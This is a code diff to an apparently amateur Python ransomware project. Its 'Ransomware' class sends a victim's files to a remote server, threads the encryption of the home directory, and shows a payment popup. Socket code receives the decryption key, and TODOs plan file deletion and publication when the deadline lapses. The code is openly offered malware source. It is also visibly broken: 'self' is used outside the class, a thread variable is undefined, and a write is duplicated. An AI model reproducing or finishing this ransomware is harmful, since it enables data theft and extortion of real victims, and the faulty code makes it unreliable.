@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 import subprocess
 import time
 import signal
-#from C2Server import Server
+import threading 
 import base64
 import logging
 import socket
@@ -146,7 +146,6 @@ class Ransomware:
                 size_of_files += file_size
                 number_of_files += 1
 
-                print(file_path)
                 # Send file to server
                 self.send_file_to_server(file_path, file)
         
@@ -196,11 +195,6 @@ class Ransomware:
         """ Closing the file. """
         file.close()
 
-        #self.send_file_to_server()
-        
-        # exec(open("mal.py").read())
-
-
 
 #Main function/ control flow
 if __name__ == '__main__':
@@ -212,7 +206,7 @@ if __name__ == '__main__':
 
     # Initialize dropper application.
     ransomware = Ransomware('tsoh', 'lacol', 729000000)
-    # Collect the malicious code and dump it into the file.
+    # Receives public key and begins to send files to the server.
     ransomware.execute_attack()
 
     #TODO: Replace this with Asymetric crypto
@@ -224,7 +218,8 @@ if __name__ == '__main__':
 
 
     #Encrypt all files
-    # encrypt_and_send_all_files(home, key)
+    # t1 = threading.Thread(target=ransomware.encrypt_and_send_all_files(), args=(home, key))
+    # t1.start()
 
 
     #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
@@ -257,10 +252,31 @@ if __name__ == '__main__':
 
     #User has paid before the time ran out
     if (ransomware.check_if_user_has_paid()):
+        t1.join()
         popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
+        
+        """ Receiving the private key. """
+        filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+        print(f"[RECV] Receiving the private key.")
+        key = open(filename, "w")
+        self._socket.sendall("Private key filename received.".encode("utf-8"))
+ 
+        """ Receiving the private key from the server. """
+        data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+        key.write(data)
+          
+        print(f"[RECV] Receiving the private key data.")
+        key.write(data)
+        self._socket.sendall("File data received".encode("utf-8"))
+        
         # decrypt_all_files(home, key)
+        
+        """ Closing the file. """
+        key.close()
+        
         #TODO: Implement code to delete all the files that are stored on the server
 
     else: # Timer has run out
         #TODO: Implement file deletion and internet publication code.
         print('huh')
+
